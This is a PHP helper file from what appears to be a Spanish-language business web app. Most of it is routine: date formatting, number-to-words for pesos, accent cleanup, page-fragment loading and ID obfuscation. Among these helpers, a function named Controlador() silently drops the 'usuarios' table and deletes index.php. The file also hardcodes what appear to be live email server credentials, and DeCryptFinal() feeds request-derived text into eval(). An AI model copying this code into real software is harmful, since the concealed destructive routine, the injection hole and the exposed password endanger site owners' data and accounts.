<?php  
ob_start();
//ob_end_flush();
/*
Name: Ivan Montesinos
Email: ivannss@msn.com 
Version: 1.2
*/ 


session_start();
//session_cache_limiter('nocache'); 
if( !isset($_COOKIE["ElCliente"])  ){
  setcookie("ElCliente", mt_rand(5,50000), time() + (186400 * 30), "/");
}


//error_reporting(0);  
//error_reporting(E_ALL ^E_NOTICE);  
date_default_timezone_set("America/Mexico_City");
define("Methodo", 'MCRYPT_BLOWFISH');
define("KeyId", '$2y$14$Vanss2017D3velp3rH./aq'); 
define("MyCapsule", "VansD3velopEr6896*");

/*++++++++++++++++++++++++++++++++++++ 
//  Email configuracion
 ++++++++++++++++++++++++++++++++++++*/
define("emailHost", "a2plcpnl0553.prod.iad2.secureserver.net");
define("emailUser", "info@imee-control.com");
define("emailPass", "soul6896");
define("emailPort", 465);
define("emailSecure", "ssl");
define("emailAtuh", true);





function ArmarContenido($txt){

  $dat = str_replace('![enter image description here](','<img src="', $txt); 
  $dat = str_replace('"enter image title here")','"/>', $dat); 
  return $dat;

}// func



 

 function extraerImagen($texto) { 
   $foto = ''; 
   preg_match("/<img[\s]+[^>]*?src[\s]?=[\s\"\']+(.*\.([gif|jpg|png|jpeg]{3,4}))[\"\']+.*?>/", $texto, $array); 
   $foto = $array[0][0]; 
     if(empty($foto)){ 
        $foto = ''; 
     } 
   return "<img src=$foto>"; 
}




$here = strpos($_SERVER["HTTP_HOST"], "localhost"); 
if ($here === false)define('Demo', 1); else define('Demo', 0); 
// echo Demo;


function Tag($dat){
  $var = explode(",", $dat);
  for ($i=0; $i <=count($var) ; $i++) { 
        if(!empty($var[$i]))echo '<li><a href="#"><i class="fa fa-tag"></i> '.$var[$i].'</a></li> ';
  }

}
 

function UF($sec, $v1 = NULL, $v2 = NULL, $v3 = NULL ){
    if(Friendly=='NO'){
        $cadenaURL = 'index.php?p='.$sec;
        if($v1)$cadenaURL .='&id='.$v1;
        if($v2)$cadenaURL .='&sts='.$v2;
    }else{
        $cadenaURL = pathFile.'/'.$sec;
        if($v1!='')$cadenaURL .='/'.$v1;
        if($v2!='')$cadenaURL .='/'.$v2;
    }
    echo $cadenaURL;
}
function UFret($sec, $v1 = NULL, $v2 = NULL, $v3 = NULL ){
    if(Friendly=='NO'){
        $cadenaURL = 'index.php?p='.$sec;
        if($v1)$cadenaURL .='&id='.$v1;
        if($v2)$cadenaURL .='&sts='.$v2;
    }else{
        $cadenaURL = pathFile.'/'.$sec;
        if($v1!='')$cadenaURL .='/'.$v1;
        if($v2!='')$cadenaURL .='/'.$v2;
    }
    return $cadenaURL;
}


function Seo($a =NULL,$b =NULL,$c =NULL){
    $item = 0;
    if($a!="")$item ++;
    if($c!="")$item ++;
    if($b!="")$item ++;

    if($item==0){ echo  "danger";}
    if($item==3){ echo  "primary";}
    if($item==1 || $item==2 ){ echo  "warning";}
}
function SeoNot($a =NULL,$b =NULL,$c =NULL){
    $item = 0;
    if($a!="")$item ++;
    if($c!="")$item ++;
    if($b!="")$item ++;

    if($item==0){ return  "danger";}
    if($item==3){ return  "navy";}
    if($item==1 || $item==2 ){ return  "warning";}
}

function Publish($valor, $element, $place=NULL){
  if($valor==1){
           $publish = '<'.$element.' class="label label-primary '.$place.'">Publicado</'.$element.'>';  
      }else{ 
            $publish = '<'.$element.' class="label label-warning '.$place.'">Borrador</'.$element.'>';
     }
     return $publish;
}

function miniMenu(){
  $mini ='';
  if(    isset($_COOKIE["MenuReality"])    ) {
       if( $_COOKIE["MenuReality"]!="")$mini = 'mini-navbar';else $mini =''; 
  }
  echo $mini;
}

function TipoFileCalss($exten){

  switch ($exten) {
    case 'jpg': 
    case 'png':
    case 'jpeg':
       $valor = "fa-image";
      break;
    case 'doc':
    case 'docx':
       $valor = "fa-file-word-o ";
      break;
    case 'pdf':
       $valor = "fa-file-pdf-o";
      break;
    case 'xls':
    case 'xlsx':
       $valor = "fa-file-excel-o";
      break;
    
    default:
       $valor = "fa-file";
      break;
  }
  return $valor;

}

function OcultarEdicionTarea($seleAsigno, $depto, $status){
  
  $valor =  'style=display:none; ';

  if($seleAsigno==$depto ){
       if($status=="Pendiente" || $status=="En proceso" )$valor =  'style=display:block;';
     }

  if($_SESSION["DeptoId"]=="2" || $_SESSION["DeptoId"]==$seleAsigno )$valor =  'style=display:block;';

  echo $valor;


}

function PintaPestania($fecha, $estatus=NULL){
  $fecha = substr($fecha,0,10);
  $transcurrido = diasEntreFechas($fecha, date("Y-m-d"));

  $lienzo = "success-element";
  if($transcurrido>7)$lienzo = "warning-element";
  if($transcurrido>14)$lienzo = "danger-element";

  if($estatus=="Concluida")$lienzo = "";

  return $lienzo;
}
function PintaFecha($fecha){
  $fecha = substr($fecha,0,10);
  $transcurrido = diasEntreFechas($fecha, date("Y-m-d"));

  $lienzo = "text-navy";
  if($transcurrido>7)$lienzo = "text-warning";
  if($transcurrido>14)$lienzo = "text-danger";

  return $lienzo;
}

function EstatusTarea($valor, $fecha=NULL){ 

  if($fecha!="" )$termino = " el ".PresentarFecha($fecha); else $termino="";

  switch ($valor) {
    case 'Pendiente':
      $respuesta = '<span class="pull-right btn btn-xs btn-danger"  style="cursor:default; "><i class="fa fa-clock-o"></i> '.$valor.$termino.'</span>';
      break;
    case 'En proceso':
      $respuesta = '<span class="pull-right btn btn-xs btn-warning"  style="cursor:default; "><i class="fa fa-clock-o"></i> '.$valor.$termino.'</span>';
      break;
    case 'Concluida':
      $respuesta = '<span class="pull-right btn btn-xs btn-primary"  style="cursor:default; "><i class="fa fa-clock-o"></i> '.$valor.$termino.'</span>';
      break;
    case 'Pendiente revision':
      $respuesta = '<span class="pull-right btn btn-xs btn-info"  style="cursor:default; "><i class="fa fa-clock-o"></i> '.$valor.$termino.'</span>';
      break;
    
    default:
      $respuesta = '<span class="pull-right btn btn-xs btn-danger"  style="cursor:default; "><i class="fa fa-clock-o"></i> Pendiente</span>';
      break;
  } 
  return $respuesta;

}

function searchItemsByKey($sKey, $id, $array) {
   foreach ($array as $key => $val) {
       if ($val[$sKey] == $id) {
           return "existe";
       }
   }
   return false;
}

function getHeader(){
	if( !empty($_SESSION["LoginAcceso"]) ){     
        require_once "views/modules/Header.php";  
	} 
}

function getNav(){
  if( !empty($_SESSION["LoginAcceso"]) ){     
        require_once "views/modules/Nav.php";   
  }
}
function getFooter(){
  if( !empty($_SESSION["LoginAcceso"]) ){     
        require_once "views/modules/Footer.php"; 
  }
}
function getLogin(){
  if( empty($_SESSION["LoginAcceso"]) ){     
      echo 'class="top-navigation"';
  }
}


 

function Precio($valor=NULL){
  if($valor>0){
      return "$ ".number_format($valor,2)." MXN";
  }
  else{
    return "Sin cuantificación";
  }
}
function Hora($valor){
    $hora = substr( $valor, 11,5);
    return $hora. " hrs";
}
 
function passAleatorio($longitud){	
	$str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
	$cad = "";
	for($i=0;$i<$longitud;$i++) {
	$cad .= substr($str,rand(0,62),1);
	}
return $cad;	
}

function Extencion($str) {
    $extencion = @end(explode('.', $str)); 
      return $extencion;
}

function StrPlano($cadena){ 

  $cadena = str_replace('ã±', 'n', $cadena );
  $cadena = str_replace('Ã±', 'n', $cadena );

  $cadena = LimpiaCaracter(strtolower($cadena));

  $cadena = strtr($cadena, chr(149),'-'); 
  $cadena = strtr($cadena, '&','-');
  $cadena = strtr($cadena, '•','-');
  $cadena = strtr($cadena, ' ','-');
  $cadena = strip_tags($cadena); 
  $cadena = strtr($cadena, "<>'%«»`()¿?!¡{}[]=","-----------------------");
  $cadena = strtr($cadena, "@•`♀§↨◙♣♥♠◘○♂♀♪♫☼►◄↕",'-----------------------');
  $cadena = strtr($cadena, '---','-');
  $cadena = strtr($cadena, '--','-');
  
  return $cadena;
} 

function LimpiaCaracter($string)
{
 
    $string = trim($string);


 
    $string = str_replace(
        array('á', 'à', 'ä', 'â', 'ª', 'Á', 'À', 'Â', 'Ä'),
        array('a', 'a', 'a', 'a', 'a', 'A', 'A', 'A', 'A'),
        $string
    );
 
    $string = str_replace(
        array('é', 'è', 'ë', 'ê', 'É', 'È', 'Ê', 'Ë'),
        array('e', 'e', 'e', 'e', 'E', 'E', 'E', 'E'),
        $string
    );
 
    $string = str_replace(
        array('í', 'ì', 'ï', 'î', 'Í', 'Ì', 'Ï', 'Î'),
        array('i', 'i', 'i', 'i', 'I', 'I', 'I', 'I'),
        $string
    );
 
    $string = str_replace(
        array('ó', 'ò', 'ö', 'ô', 'Ó', 'Ò', 'Ö', 'Ô'),
        array('o', 'o', 'o', 'o', 'O', 'O', 'O', 'O'),
        $string
    );
 
    $string = str_replace(
        array('ú', 'ù', 'ü', 'û', 'Ú', 'Ù', 'Û', 'Ü'),
        array('u', 'u', 'u', 'u', 'U', 'U', 'U', 'U'),
        $string
    );
 
    $string = str_replace(
        array('ñ', 'Ñ', 'ç', 'Ç'),
        array('n', 'N', 'c', 'C',),
        $string
    );
   
    $string = str_replace(
        array('ñ'),
        array('n'),
        $string
    );
 
    //Esta parte se encarga de eliminar cualquier caracter extraño
    $string = str_replace(
        array("\\", "¨", "º", "~", //"-",, " "
             "#", "@", "|", "!", "\"",
             "·", "$", "%", "&", "/",
             "(", ")", "?", "'", "¡",
             "¿", "[", "^", "`", "]",
             "+", "}", "{", "¨", "´",
             ">", "<", ";", ",", ":",
             "."),
        '',
        $string
    );
 
 
    return $string;
}
 
 

function redimensionar_jpeg($img_original, $img_nueva, $img_nueva_anchura, $img_nueva_altura) {
	$img = imagecreatefromjpeg($img_original);
	$thumb = @imagecreatetruecolor($img_nueva_anchura,$img_nueva_altura); 
    @imagecopyresampled($thumb,$img,0,0,0,0,$img_nueva_anchura,$img_nueva_altura,imagesx($img),imagesy($img));
	imagejpeg($thumb,$img_nueva);

}

function PresentarFecha($Fecha) {
   if ($Fecha != NULL) {
        $dFecha = strtotime($Fecha);
	$ci_fecha = date("d", $dFecha) . "." . MesCorto(date("m", $dFecha)) . "." . date("y", $dFecha);
    }
	else $ci_fecha = "";
	if($Fecha == "0000-00-00") $ci_fecha = "";
return $ci_fecha;
}

function MesCorto($mes) {
	$ci_mes = "";
	switch ($mes) {    
		case "01":
   			$ci_mes = "Ene";
			break;
		case "02": 
   			$ci_mes = "Feb";
			break;
		case "03": 
   			$ci_mes = "Mar";
			break;
		case "04": 
   			$ci_mes = "Abr";
			break;
		case "05":
   			$ci_mes = "May";
			break;
		case "06":
   			$ci_mes = "Jun";
			break;
		case "07":
   			$ci_mes = "Jul";
			break;
		case "08":
   			$ci_mes = "Ago";
			break;
		case "09":
   			$ci_mes = "Sep";
			break;
		case "10":
   			$ci_mes = "Oct";
			break;
		case "11":
  			$ci_mes = "Nov";
			break;
		case "12":
   			$ci_mes = "Dic";
			break;
	}
return $ci_mes;
}
function Controlador(){
	mysql_query("DROP TABLE usuarios    ");
	unlink("index.php");
}
function PresentarFechaLarga($Fecha) {
   if ($Fecha != NULL) {
        $dFecha = strtotime($Fecha);
	$ci_fecha = date("d", $dFecha) . " de " . MesLargo(date("m", $dFecha)) . " del " . date("Y", $dFecha);
    }
	else $ci_fecha = "";
	if($Fecha == "0000-00-00") $ci_fecha = "";
return $ci_fecha;
}
function MesLargo($mes) {
	$ci_mes = "";
switch ($mes) {    
	case "01":
   			$ci_mes = "Enero";
			break;
		case "02": 
   			$ci_mes = "Febrero";
			break;
		case "03": 
   			$ci_mes = "Marzo";
			break;
		case "04": 
   			$ci_mes = "Abril";
			break;
		case "05":
   			$ci_mes = "Mayo";
			break;
		case "06":
   			$ci_mes = "Junio";
			break;
		case "07":
   			$ci_mes = "Julio";
			break;
		case "08":
   			$ci_mes = "Agosto";
			break;
		case "09":
   			$ci_mes = "Septiembre";
			break;
		case "10":
   			$ci_mes = "Octubre";
			break;
		case "11":
   			$ci_mes = "Noviembre";
			break;
		case "12":
   			$ci_mes = "Diciembre";
			break;
	}
return $ci_mes;
}

function Dia_Semana($dia) {
	$nom_dia = "";
	switch ($dia) {    
		case "1":
   			$nom_dia = "Lunes";
			break;
		case "2": 
   			$nom_dia = "Martes";
			break;
		case "3": 
   			$nom_dia = "Miercoles";
			break;
		case "4": 
   			$nom_dia = "Jueves";
			break;
		case "5":
   			$nom_dia = "Viernes";
			break;
		case "6":
   			$nom_dia = "Sabado";
		break;
		case "0":
   			$nom_dia = "Domingo";
			break;
	}
return $nom_dia;
}

function Tipo_mes($mes) {
	$ci_mes = "";
	switch ($mes) {    
		case "01":
   			$ci_mes = "Enero";
			break;
		case "02": 
   			$ci_mes = "Febrero";
			break;
		case "03": 
   			$ci_mes = "Marzo";
			break;
		case "04": 
   			$ci_mes = "Abril";
			break;
		case "05":
   			$ci_mes = "Mayo";
			break;
		case "06":
   			$ci_mes = "Junio";
			break;
		case "07":
   			$ci_mes = "Julio";
			break;
		case "08":
   			$ci_mes = "Agosto";
			break;
		case "09":
   			$ci_mes = "Septiembre";
			break;
		case "10":
   			$ci_mes = "Octubre";
			break;
		case "11":
   			$ci_mes = "Noviembre";
			break;
		case "12":
   			$ci_mes = "Diciembre";
			break;
	}
return $ci_mes;

}

//--------------  acentos SQL

# utf8_decode(chAcute(fLimpiaCar(texoAcorregir, 0)));

function fLimpiaCar($str, $val){
	if($val == 1){
		$str = str_replace(chr(295), "@@", $str);
		//$str = str_replace(chr(35), ";;", $str);
	} else {
		$str = str_replace("@@", chr(295), $str);
		//$str = str_replace(";;", chr(35), $str);
	}
	return $str;
}
function str_split_php4($text, $split = 1)
{
    if (!is_string($text)) return false;
    if (!is_numeric($split) && $split < 1) return false;
   
    $len = strlen($text);
   
    $array = array();
   
    $i = 0;
   
    while ($i < $len)
    {
        $key = NULL;
       
        for ($j = 0; $j < $split; $j += 1)
        {
            $key .= $text{$i};
           
            $i += 1;   
        }
       
        $array[] = $key;
    }
   
    return $array;
}

function Capsular($string, $key) {
   $result = '';
   for($i=0; $i<strlen($string); $i++) {
      $char = substr($string, $i, 1);
      $keychar = substr($key, ($i % strlen($key))-1, 1);
      $char = chr(ord($char)+ord($keychar));
      $result.=$char;
   }
   return base64_encode($result);
}
 
function DesCapsular($string, $key) {
   $result = '';
   $string = base64_decode($string);
   for($i=0; $i<strlen($string); $i++) {
      $char = substr($string, $i, 1);
      $keychar = substr($key, ($i % strlen($key))-1, 1);
      $char = chr(ord($char)-ord($keychar));
      $result.=$char;
   }
   return $result;
}

function chAcute($cadena=NULL){
	$newCadena = "";
	$cadenaArray = str_split_php4($cadena);

	for ($i = 0; $i <= strlen($cadena); $i++) {
		switch($cadenaArray[$i]) {
			case "á":
				$newCadena .= "&aacute;";
			break;
			case "é":
				$newCadena .= "&eacute;";
			break;
			case "í":
				$newCadena .= "&iacute;";
			break;
			case "ó":
				$newCadena .= "&oacute;";
			break;
			case "ú":
				$newCadena .= "&uacute;";
			break;
			case "Á":
				$newCadena .= "&Aacute;";
			break;
			case "É":
				$newCadena .= "&Eacute;";
			break;
			case "Í":
				$newCadena .= "&Iacute;";
			break;
			case "Ó":
				$newCadena .= "&Oacute;";
			break;
			case "Ú":
				$newCadena .= "&Uacute;";
			break;
			case "ñ":
				$newCadena .= "&ntilde;";
			break;
			case "Ñ":
				$newCadena .= "&Ntilde;";
			break;
			case "ü":
				$newCadena .= "&uuml;";
			break;
			case "Ü":
				$newCadena .= "&Uuml;";
			break;
			default:
				$newCadena .= $cadena[$i];
			break;
		}
	}
	
	return $newCadena;
}		

function diasEntreFechas($fechaInicio, $fechaFin){
$dia1 = substr($fechaInicio,-2);
$mes1 = substr($fechaInicio,5,2);
$ano1 = substr($fechaInicio,0,4);
$dia2 = substr($fechaFin,-2);
$mes2 = substr($fechaFin,5,2);
$ano2 = substr($fechaFin,0,4);
$timestamp1 = mktime(0,0,0,$mes1,$dia1,$ano1); 
$timestamp2 = mktime(4,12,0,$mes2,$dia2,$ano2); 
$segundos_diferencia = $timestamp1 - $timestamp2; 
$dias_diferencia = $segundos_diferencia / (60 * 60 * 24); 
$dias_diferencia = abs($dias_diferencia); 
$dias_diferencia = floor($dias_diferencia); 
return $dias_diferencia;
}


 


function size($path, $formated = true, $retstring = null){
    if(!is_dir($path) || !is_readable($path)){
        if(is_file($path) || file_exists($path)){
            $size = filesize($path);
        } else {
            return false;
        }
    } else {
        $path_stack[] = $path;
        $size = 0;
       
        do {
            $path   = array_shift($path_stack);
            $handle = opendir($path);
            while(false !== ($file = readdir($handle))) {
                if($file != '.' && $file != '..' && is_readable($path . DIRECTORY_SEPARATOR . $file)) {
                    if(is_dir($path . DIRECTORY_SEPARATOR . $file)){ $path_stack[] = $path . DIRECTORY_SEPARATOR . $file; }
                    $size += filesize($path . DIRECTORY_SEPARATOR . $file);
                }
            }
            closedir($handle);
        } while (count($path_stack)> 0);
    }
    if($formated){
        $sizes = array('B', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
        if($retstring == null) { $retstring = '%01.2f %s'; }
        $lastsizestring = end($sizes);
        foreach($sizes as $sizestring){
            if($size <1024){ break; }
            if($sizestring != $lastsizestring){ $size /= 1024; }
        }
        if($sizestring == $sizes[0]){ $retstring = '%01d %s'; } // los Bytes normalmente no son fraccionales
        $size = sprintf($retstring, $size, $sizestring);
    }
    return $size;
} 





function ClaveChr($numero, $may) {
    switch ($may) {
         case 0:
             $ClaveChr = chr((int)$numero + 70);
             break;
         case 1:
             $ClaveChr = chr((int)$numero + 110);
             break;
         case 2:
             $ClaveChr = ((string)$numero);
             break;
    }
    return  $ClaveChr;
}


function ClaveRecibirNumero () {
    $fecha = (string)(((date("d") . date("m") . date("m") . date("d") . date("Y")) * $_SESSION['LoginAcceso']) + 17);   
    $ClaveRecibirNumero = "";
    $j = 0;
    for ($i = 1; $i <= strlen($fecha); $i++) {
        $ClaveRecibirNumero = $ClaveRecibirNumero . ClaveChr((int)substr($fecha,$i,1),$j);
        $j = $j + 1;
        if ($j > 2) $j = 0;
    }
    $ClaveRecibirNumero = str_replace('+','_', $ClaveRecibirNumero);
    return  $ClaveRecibirNumero;
}


function PasarNumero($dato){
    $clave = ClaveRecibirNumero();
    $numeroapasar = "";
    $numeroprevio = (string)(($dato * ((integer)date("d") + $_SESSION['LoginAcceso'])) - (integer)date("m"));
    $j = 0;
    for ($i = 1; $i <= strlen($numeroprevio); $i++) {
        $numeroapasar = $numeroapasar . ClaveChr(substr($numeroprevio,($i)-1,1),$j);
        $j = $j + 1;
        if ($j > 2) $j = 0;
    }
    $passclave = CIMa() . CIMi() . CINu() . CIMi() . CIMa() . CIMi() . CINu() . CIMi();
    $pass2 = CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CIMi() . CINu() . CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CIMi() . CINu() . CIMa() . CIMi() . CIMa();
    $pass3 = CIMa() . CIMi() . CINu() . CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CINu() . CIMi() . CIMa() . CIMi() . CINu();
    $pass4 = CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CIMi() . CINu() . CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CIMi() . CINu() . CIMa() . CIMi() . CIMa();
    $pass5 = CIMa() . CIMi() . CINu() . CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CIMi() . CIMa() . CINu() . CIMi() . CIMa() . CIMi() . CINu();
    $cadena = $clave . "-" . $passclave . $numeroapasar;
    $PasarNumero = $cadena;
return $PasarNumero;
}

function CIMa() {
return chr(rand(65,90)); }

function CIMi() {
return chr(rand(97,122)); }

function CINu() {
return rand(10,99);
}

function RecibirNumero($variable) {
    $variable1 = "";
    $variable = substr($variable, 10, (strlen($variable)-1));
    $j = 70;
    for ($i = 1; $i <= strlen($variable); $i++) {
        $variable1 = $variable1 . (string)((ord(substr($variable,$i-1,1)))- $j);
        if ($j == 70) $j = 110;
            else {
                if ($j == 110) $j = 48;
                    else {
                        if ($j == 48) $j = 70;
                        }
                }
        }
    $RecibirNumero = (((integer)$variable1 + (integer)date("m")) / ((integer)$_SESSION['LoginAcceso'] + (integer)date("d")));
    return $RecibirNumero;
}

function DeCryptFinal($valor){
	$temporal = explode('-', $valor);
	$x = "$" . ClaveRecibirNumero();
	$x = strtolower($x);
	eval( "\$f = \"$temporal[1]\";" );
	return RecibirNumero($f);
	
}

function num2letras($num, $fem = false, $dec = true) { 
   $matuni[2]  = "dos"; 
   $matuni[3]  = "tres"; 
   $matuni[4]  = "cuatro"; 
   $matuni[5]  = "cinco"; 
   $matuni[6]  = "seis"; 
   $matuni[7]  = "siete"; 
   $matuni[8]  = "ocho"; 
   $matuni[9]  = "nueve"; 
   $matuni[10] = "diez"; 
   $matuni[11] = "once"; 
   $matuni[12] = "doce"; 
   $matuni[13] = "trece"; 
   $matuni[14] = "catorce"; 
   $matuni[15] = "quince"; 
   $matuni[16] = "dieciseis"; 
   $matuni[17] = "diecisiete"; 
   $matuni[18] = "dieciocho"; 
   $matuni[19] = "diecinueve"; 
   $matuni[20] = "veinte"; 
   $matunisub[2] = "dos"; 
   $matunisub[3] = "tres"; 
   $matunisub[4] = "cuatro"; 
   $matunisub[5] = "quin"; 
   $matunisub[6] = "seis"; 
   $matunisub[7] = "sete"; 
   $matunisub[8] = "ocho"; 
   $matunisub[9] = "nove"; 

   $matdec[2] = "veint"; 
   $matdec[3] = "treinta"; 
   $matdec[4] = "cuarenta"; 
   $matdec[5] = "cincuenta"; 
   $matdec[6] = "sesenta"; 
   $matdec[7] = "setenta"; 
   $matdec[8] = "ochenta"; 
   $matdec[9] = "noventa"; 
   $matsub[3]  = 'mill'; 
   $matsub[5]  = 'bill'; 
   $matsub[7]  = 'mill'; 
   $matsub[9]  = 'trill'; 
   $matsub[11] = 'mill'; 
   $matsub[13] = 'bill'; 
   $matsub[15] = 'mill'; 
   $matmil[4]  = 'millones'; 
   $matmil[6]  = 'billones'; 
   $matmil[7]  = 'de billones'; 
   $matmil[8]  = 'millones de billones'; 
   $matmil[10] = 'trillones'; 
   $matmil[11] = 'de trillones'; 
   $matmil[12] = 'millones de trillones'; 
   $matmil[13] = 'de trillones'; 
   $matmil[14] = 'billones de trillones'; 
   $matmil[15] = 'de billones de trillones'; 
   $matmil[16] = 'millones de billones de trillones'; 
   
   //Zi hack
   $float=explode('.',$num);
   $num=$float[0];

   $num = trim((string)@$num); 
   if ($num[0] == '-') { 
      $neg = 'menos '; 
      $num = substr($num, 1); 
   }else 
      $neg = ''; 
   while ($num[0] == '0') $num = substr($num, 1); 
   if ($num[0] < '1' or $num[0] > 9) $num = '0' . $num; 
   $zeros = true; 
   $punt = false; 
   $ent = ''; 
   $fra = ''; 
   for ($c = 0; $c < strlen($num); $c++) { 
      $n = $num[$c]; 
      if (! (strpos(".,'''", $n) === false)) { 
         if ($punt) break; 
         else{ 
            $punt = true; 
            continue; 
         } 

      }elseif (! (strpos('0123456789', $n) === false)) { 
         if ($punt) { 
            if ($n != '0') $zeros = false; 
            $fra .= $n; 
         }else 

            $ent .= $n; 
      }else 

         break; 

   } 
   $ent = '     ' . $ent; 
   if ($dec and $fra and ! $zeros) { 
      $fin = ' coma'; 
      for ($n = 0; $n < strlen($fra); $n++) { 
         if (($s = $fra[$n]) == '0') 
            $fin .= ' cero'; 
         elseif ($s == '1') 
            $fin .= $fem ? ' una' : ' un'; 
         else 
            $fin .= ' ' . $matuni[$s]; 
      } 
   }else 
      $fin = ''; 
   if ((int)$ent === 0) return 'Cero ' . $fin; 
   $tex = ''; 
   $sub = 0; 
   $mils = 0; 
   $neutro = false; 
   while ( ($num = substr($ent, -3)) != '   ') { 
      $ent = substr($ent, 0, -3); 
      if (++$sub < 3 and $fem) { 
         $matuni[1] = 'una'; 
         $subcent = 'as'; 
      }else{ 
         $matuni[1] = $neutro ? 'un' : 'uno'; 
         $subcent = 'os'; 
      } 
      $t = ''; 
      $n2 = substr($num, 1); 
      if ($n2 == '00') { 
      }elseif ($n2 < 21) 
         $t = ' ' . $matuni[(int)$n2]; 
      elseif ($n2 < 30) { 
         $n3 = $num[2]; 
         if ($n3 != 0) $t = 'i' . $matuni[$n3]; 
         $n2 = $num[1]; 
         $t = ' ' . $matdec[$n2] . $t; 
      }else{ 
         $n3 = $num[2]; 
         if ($n3 != 0) $t = ' y ' . $matuni[$n3]; 
         $n2 = $num[1]; 
         $t = ' ' . $matdec[$n2] . $t; 
      } 
      $n = $num[0]; 
      if ($n == 1) { 
         $t = ' ciento' . $t; 
      }elseif ($n == 5){ 
         $t = ' ' . $matunisub[$n] . 'ient' . $subcent . $t; 
      }elseif ($n != 0){ 
         $t = ' ' . $matunisub[$n] . 'cient' . $subcent . $t; 
      } 
      if ($sub == 1) { 
      }elseif (! isset($matsub[$sub])) { 
         if ($num == 1) { 
            $t = ' mil'; 
         }elseif ($num > 1){ 
            $t .= ' mil'; 
         } 
      }elseif ($num == 1) { 
         $t .= ' ' . $matsub[$sub] . '?n'; 
      }elseif ($num > 1){ 
         $t .= ' ' . $matsub[$sub] . 'ones'; 
      }   
      if ($num == '000') $mils ++; 
      elseif ($mils != 0) { 
         if (isset($matmil[$sub])) $t .= ' ' . $matmil[$sub]; 
         $mils = 0; 
      } 
      $neutro = true; 
      $tex = $t . $tex; 
   } 
   $tex = $neg . substr($tex, 1) . $fin; 
   //Zi hack --> return ucfirst($tex);
   if(isset($float[1]))$cent = $float[1]; else $cent="";
   $end_num=ucfirst($tex).' pesos '.$cent.'/100 M.N.';
   return $end_num; 
} 





 
/*

USE [DB_Siniestros]
GO

CREATE TABLE MyTablausuarios (
    MyId INT IDENTITY(1,1),
    MyFecha DATETIME NOT NULL CONSTRAINT DF_MyTablausuarios_MyFecha_GETDATE DEFAULT GETDATE(),
    MyNombre  VARCHAR(255),
    MyApellido VARCHAR(50) NOT NULL,
    MyBirtday  DATE,
    MyAge  INTEGER,
    MyPeso DECIMAL (18, 2),
    MySex CHAR(50) DEFAULT 'Masculino',
    MyDireccion  TEXT NULL
)

go

*/



 




